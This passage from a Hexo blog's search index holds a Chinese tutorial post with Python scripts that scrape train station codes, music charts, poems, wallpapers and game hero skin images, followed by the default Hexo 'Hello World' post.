class="line"><span class="string">&quot;Soft&quot;</span>: SoftBeds,</span><br><span class="line"><span class="string">&quot;HBed&quot;</span>: HardBeds,</span><br><span class="line"><span class="string">&quot;HSeats&quot;</span>: HardSeats,</span><br><span class="line"><span class="string">&quot;NSeats&quot;</span>: NoSeats</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># print(di)</span></span><br><span class="line">lis.append(di)</span><br><span class="line">pd.set_option(<span class="string">&#x27;display.max_rows&#x27;</span>,<span class="literal">None</span>) <span class="comment">#å±•ç¤ºæœ€å¤§åŒ–ï¼ŒæŠŠæ‰€æœ‰è¡Œå±•ç¤ºå‡ºæ¥</span></span><br><span class="line">content = pd.DataFrame(lis)</span><br><span class="line"><span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/06/fDMaIr74u2E1OZn.png" alt="image-20220406083305519.png"></p><p>ç”Ÿæˆstations.jsonæ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get_station_code.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getResponse</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">        response = requests.get(url,headers = headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;https://kyfw.12306.cn/otn/resources/js/framework/station_name.js&quot;</span></span><br><span class="line">    data = getResponse(url)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        dict_data = &#123;&#125;</span><br><span class="line">        text = data.text</span><br><span class="line">        str_split = text.split(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> chars <span class="keyword">in</span> str_split[<span class="number">1</span>:]:</span><br><span class="line">            station = chars.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">            dict_data[station[<span class="number">1</span>]] = station[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;stations.json&quot;</span>,<span class="string">&#x27;w&#x27;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">            json.dump(dict_data,fp,ensure_ascii = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="ç½‘æ˜“äº‘çƒ­æ­Œçˆ¬å–"><a href="#ç½‘æ˜“äº‘çƒ­æ­Œçˆ¬å–" class="headerlink" title="ç½‘æ˜“äº‘çƒ­æ­Œçˆ¬å–"></a>ç½‘æ˜“äº‘çƒ­æ­Œçˆ¬å–</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 163MusicGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\âœ©\Ëš\*\â€¢Ì©Ì©Í™Êš]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#å„ä¸ªç¬¦å·é—´ç”¨è½¬ä¹‰å­—ç¬¦éš”å¼€</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;music\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://music.163.com/discover/toplist?id=19723756&quot;</span> <span class="comment">#ä¸åŒæ¦œå•åˆ‡æ¢è¯¥idå³å¯</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line">html_data = re.findall(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;/song\?id=(\d+)&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>,response.text) <span class="comment"># ï¼Ÿå‰é¢è®°å¾—åŠ ä¸ªè½¬ä¹‰å­—ç¬¦</span></span><br><span class="line"><span class="keyword">for</span> music_id,music_name <span class="keyword">in</span> html_data:</span><br><span class="line"><span class="comment"># ä¸‹è½½åœ°å€ï¼šhttps://music.163.com/song/media/outer/url?id=1933915376.mp3</span></span><br><span class="line">music_url = <span class="string">f&quot;https://music.163.com/song/media/outer/url?id=<span class="subst">&#123;music_id&#125;</span>.mp3&quot;</span></span><br><span class="line">music_content = requests.get(url=music_url,headers=headers).content</span><br><span class="line">music_name = change_name(music_name)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename + music_name +<span class="string">&#x27;.mp3&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(music_content)</span><br><span class="line"><span class="built_in">print</span>(music_id,music_name)</span><br></pre></td></tr></table></figure><p>MP3æ–‡ä»¶ä¿å­˜åœ¨musicæ–‡ä»¶å¤¹ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/04/06/u73hIWizV69jsMb.png" alt="image-20220406084013424.png"></p><h4 id="å¤è¯—è¯çˆ¬å–"><a href="#å¤è¯—è¯çˆ¬å–" class="headerlink" title="å¤è¯—è¯çˆ¬å–"></a>å¤è¯—è¯çˆ¬å–</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PoetryGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.oh100.com/shici/1127009.html&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding</span><br><span class="line">li = re.findall(<span class="string">&quot;\d+?ã€(.*?)&lt;/p&gt;&lt;p&gt;&quot;</span>,response.text)</span><br><span class="line">li[-<span class="number">1</span>] = re.sub(<span class="string">r&quot;&lt;/p&gt;&lt;script&gt;s\(\&quot;content_relate\&quot;\)\;\&lt;\/script\&gt;\&lt;p\&gt;\ã€å½¢å®¹æ´’è„±çš„è¯—è¯\ã€‘ç›¸å…³æ–‡ç« \ï¼š&quot;</span>,<span class="string">&quot;&quot;</span>,li[-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> se <span class="keyword">in</span> li:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;- &quot;</span>+se)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/06/JXvfrT9FMqRDAPa.png" alt="image-20220406084235256.png"></p><h4 id="å£çº¸çˆ¬å–"><a href="#å£çº¸çˆ¬å–" class="headerlink" title="å£çº¸çˆ¬å–"></a>å£çº¸çˆ¬å–</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># WallPaperGet.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">æ•´ä½“æ€è·¯ï¼š</span></span><br><span class="line"><span class="string">1ã€è®¿é—®ç½‘ç«™æŸ¥çœ‹ä¿¡æ¯ï¼ˆF12ä¸å¯ç”¨å¯ä»¥å…ˆåœ¨åˆ«çš„ç½‘é¡µæ‰“å¼€å†è®¿é—®è¯¥ç½‘å€ï¼‰</span></span><br><span class="line"><span class="string">2ã€è¿›å…¥å¯¹åº”tagè§‚å¯Ÿrequestçš„headersç­‰ä¿¡æ¯ï¼ˆæ³¨æ„è¦ç‚¹å‡»åŠ è½½æ›´å¤šåå†çœ‹XHRä¸‹çš„æ–‡ä»¶ï¼‰</span></span><br><span class="line"><span class="string">3ã€è¿›å…¥ç‰¹å®šç…§ç‰‡è§‚å¯Ÿä¿¡æ¯</span></span><br><span class="line"><span class="string">4ã€åœ¨textå±æ€§ä¸­è·å–titleã€img_urlç­‰ä¿¡æ¯</span></span><br><span class="line"><span class="string">5ã€åœ¨æœ¬åœ°ä¿å­˜ä¸‹æ¥</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;img\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_title</span>(<span class="params">name</span>): <span class="comment">#é‡å‘½åæ–‡ä»¶ï¼Œé˜²æ­¢åŸæœ‰ä¿å­˜æ–‡ä»¶åä¸åˆæ³•</span></span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#å„ä¸ªç¬¦å·é—´ç”¨è½¬ä¹‰å­—ç¬¦éš”å¼€</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>): <span class="comment">#æŒ‡å®šé¡µæ•°</span></span><br><span class="line">url = <span class="string">f&quot;https://m.bcoderss.com/tag/%e7%be%8e%e5%a5%b3/page/<span class="subst">&#123;page&#125;</span>/&quot;</span> <span class="comment"># %e7%be%8e%e5%a5%b3ä»£è¡¨äº†ç¾å¥³è¿™ä¸ªæ ‡ç­¾ï¼Œå¯ä»¥è‡ªè¡Œé€‰æ‹©</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,headers=headers) <span class="comment">#è¯¥ç½‘ç«™æ˜¯ä¸ªpostè¯·æ±‚ä½†æ˜¯ä¸éœ€è¦ä¼ params</span></span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line">href = re.findall(<span class="string">&#x27;&lt;li&gt;&lt;a target=&quot;_blank&quot; href=&quot;(.*?)&quot;&#x27;</span>,response.text)[<span class="number">2</span>:] <span class="comment">#æ‰¾åˆ°æ‰€æœ‰çš„ç…§ç‰‡åˆå§‹åœ°å€ï¼Œå‰ä¸¤ä¸ªæ˜¯æ— ç”¨åœ°å€</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> href:</span><br><span class="line">response_1 = requests.get(url=index,headers=headers) <span class="comment">#è®¿é—®ç…§ç‰‡åˆå§‹åœ°å€</span></span><br><span class="line">title = re.findall(<span class="string">&quot;&lt;title&gt;(.*?)&lt;/title&gt;&quot;</span>,response_1.text)[<span class="number">0</span>] <span class="comment">#è·å–ç…§ç‰‡æ ‡é¢˜</span></span><br><span class="line">title = change_title(title)</span><br><span class="line">img_url = re.findall(<span class="string">&#x27;&lt;img alt=&quot;.*?&quot; title=&quot;.*?&quot; src=&quot;(.*?)&quot;&gt;&#x27;</span>,response_1.text)[<span class="number">0</span>] <span class="comment">#è·å–ç…§ç‰‡ä¸‹è½½åœ°å€</span></span><br><span class="line">img_content = requests.get(url=img_url,headers=headers).content <span class="comment">#è·å–ç…§ç‰‡å†…å®¹</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename + title + <span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f: <span class="comment">#ä¿å­˜ç…§ç‰‡</span></span><br><span class="line">f.write(img_content)</span><br><span class="line"><span class="built_in">print</span>(title,img_url)</span><br></pre></td></tr></table></figure><p>å£çº¸ä¼šä¿å­˜åœ¨imgæ–‡ä»¶å¤¹ä¸‹ï¼ˆå›¾ç‰‡ä¸æ˜¯å¾ˆé€‚åˆæ”¾å‡ºæ¥ï¼Œå°±æ”¾ä¸‹æ–‡å­—å§â€¦ï¼‰</p><p><img src="https://s2.loli.net/2022/04/06/hgFZor87UKQkRjd.png" alt="image-20220406084429168.png"></p><h4 id="LOLè‹±é›„çš®è‚¤å›¾ç‰‡çˆ¬å–"><a href="#LOLè‹±é›„çš®è‚¤å›¾ç‰‡çˆ¬å–" class="headerlink" title="LOLè‹±é›„çš®è‚¤å›¾ç‰‡çˆ¬å–"></a>LOLè‹±é›„çš®è‚¤å›¾ç‰‡çˆ¬å–</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># LOL.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\âœ©\Ëš\*\â€¢Ì©Ì©Í™Êš]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#å„ä¸ªç¬¦å·é—´ç”¨è½¬ä¹‰å­—ç¬¦éš”å¼€</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_img</span>(<span class="params">name,title,skin_name,skin_url</span>):</span><br><span class="line">filename = <span class="string">f&#x27;<span class="subst">&#123;name+title&#125;</span>\\&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line">content = requests.get(url=skin_url,headers=headers).content</span><br><span class="line">newname = change_name(skin_name)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename+newname+<span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br><span class="line"><span class="built_in">print</span>(skin_name)</span><br><span class="line"></span><br><span class="line">hero_list_url = <span class="string">&quot;https://game.gtimg.cn/images/lol/act/img/js/heroList/hero_list.js?ts=2748291&quot;</span></span><br><span class="line">response = requests.get(url=hero_list_url,headers=headers)</span><br><span class="line">hero_list = response.json()[<span class="string">&#x27;hero&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> hero <span class="keyword">in</span> hero_list:</span><br><span class="line">hero_id = hero[<span class="string">&#x27;heroId&#x27;</span>]</span><br><span class="line">hero_name = hero[<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line">hero_title = hero[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">hero_url = <span class="string">f&quot;https://game.gtimg.cn/images/lol/act/img/js/hero/<span class="subst">&#123;hero_id&#125;</span>.js&quot;</span></span><br><span class="line">response_1 = requests.get(url=hero_url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(hero_id,hero_name,hero_title)</span><br><span class="line">skin_list = response_1.json()[<span class="string">&#x27;skins&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> skin <span class="keyword">in</span> skin_list:</span><br><span class="line"><span class="keyword">if</span>(skin[<span class="string">&#x27;mainImg&#x27;</span>]):</span><br><span class="line">skin_url = skin[<span class="string">&#x27;mainImg&#x27;</span>]</span><br><span class="line">skin_name = skin[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">save_img(hero_name,hero_title,skin_name,skin_url)</span><br><span class="line"><span class="comment"># print(skin_url)</span></span><br></pre></td></tr></table></figure><p>å„ä¸ªè‹±é›„çš„çš®è‚¤ä¼šä¿å­˜åœ¨è‡ªå·±çš„æ–‡ä»¶ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/04/06/LEcIVRNbux1rnDA.png" alt="image-20220406084813906.png"></p><p><img src="https://s2.loli.net/2022/04/06/R4XxZkbLVtwQcHe.png" alt="image-20220406084841993.png"></p><h4 id="ç‹è€…è£è€€è‹±é›„çš®è‚¤çˆ¬å–"><a href="#ç‹è€…è£è€€è‹±é›„çš®è‚¤çˆ¬å–" class="headerlink" title="ç‹è€…è£è€€è‹±é›„çš®è‚¤çˆ¬å–"></a>ç‹è€…è£è€€è‹±é›„çš®è‚¤çˆ¬å–</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wzry.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">new_name = re.sub(<span class="string">r&#x27;[\/\\\:\*\?\&quot;\&lt;\&gt;\|\âœ©\Ëš\*\â€¢Ì©Ì©Í™Êš]&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,name) <span class="comment">#å„ä¸ªç¬¦å·é—´ç”¨è½¬ä¹‰å­—ç¬¦éš”å¼€</span></span><br><span class="line"><span class="keyword">return</span> new_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_img</span>(<span class="params">name,title,skin_name,skin_url</span>):</span><br><span class="line">filename = <span class="string">f&quot;<span class="subst">&#123;title+name&#125;</span>\\&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">os.mkdir(filename)</span><br><span class="line">content = requests.get(url=skin_url,headers=headers).content</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename+skin_name+<span class="string">&#x27;_&#x27;</span>+name+<span class="string">&#x27;.jpg&#x27;</span>,mode=<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(content)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">herolist_url = <span class="string">&quot;https://pvp.qq.com/web201605/js/herolist.json&quot;</span></span><br><span class="line">herolist = requests.get(url=herolist_url,headers=headers).json()</span><br><span class="line"><span class="keyword">for</span> hero <span class="keyword">in</span> herolist:</span><br><span class="line">hero_ename = hero[<span class="string">&#x27;ename&#x27;</span>]</span><br><span class="line">hero_name = hero[<span class="string">&#x27;cname&#x27;</span>]</span><br><span class="line">hero_title = hero[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(hero_ename,hero[<span class="string">&#x27;cname&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;skin_name&#x27;</span> <span class="keyword">in</span> hero):</span><br><span class="line">skin_list = hero[<span class="string">&#x27;skin_name&#x27;</span>].split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">hero_url = <span class="string">f&quot;https://pvp.qq.com/web201605/herodetail/<span class="subst">&#123;hero_ename&#125;</span>.shtml&quot;</span></span><br><span class="line">response = requests.get(url=hero_url,headers=headers)</span><br><span class="line">response.encoding = response.apparent_encoding</span><br><span class="line">tu = re.findall(<span class="string">&#x27;&lt;ul class=\&quot;pic-pf-list pic-pf-list3\&quot; data-imgname=\&quot;(.*?)\&amp;0\|(.*?)\&amp;0\|(.*?)\&amp;72\&quot;&gt;&#x27;</span>,response.text)</span><br><span class="line">skin_list = <span class="built_in">list</span>(tu[<span class="number">0</span>])</span><br><span class="line">skin_lens = <span class="built_in">len</span>(skin_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(skin_lens):</span><br><span class="line">skin_url = <span class="string">f&quot;https://game.gtimg.cn/images/yxzj/img201606/heroimg/<span class="subst">&#123;hero_ename&#125;</span>/<span class="subst">&#123;hero_ename&#125;</span>-bigskin-<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>.jpg&quot;</span></span><br><span class="line">skin_name = skin_list[i]</span><br><span class="line">save_img(hero_name,hero_title,skin_name,skin_url)</span><br><span class="line"><span class="built_in">print</span>(skin_name,hero_name)</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ä¿å­˜æ€è·¯ä¸LOLä¸€è‡´ï¼š</p><p><img src="https://s2.loli.net/2022/04/06/qpJTLrSeatgcbKk.png" alt="image-20220406085029196.png"></p><p><img src="https://s2.loli.net/2022/04/06/6RMvwCJk37HqOfi.png" alt="image-20220406085046682.png"></p><h4 id="æœªå®Œå¾…ç»­â€¦â€¦"><a href="#æœªå®Œå¾…ç»­â€¦â€¦" class="headerlink" title="æœªå®Œå¾…ç»­â€¦â€¦"></a>æœªå®Œå¾…ç»­â€¦â€¦</h4>]]></content>
      
      
      <categories>
          
          <category> çˆ¬è™« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> çˆ¬è™« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/05/hello-world/"/>
      <url>/2022/04/05/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test1 </tag>
            
            <tag> test2 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
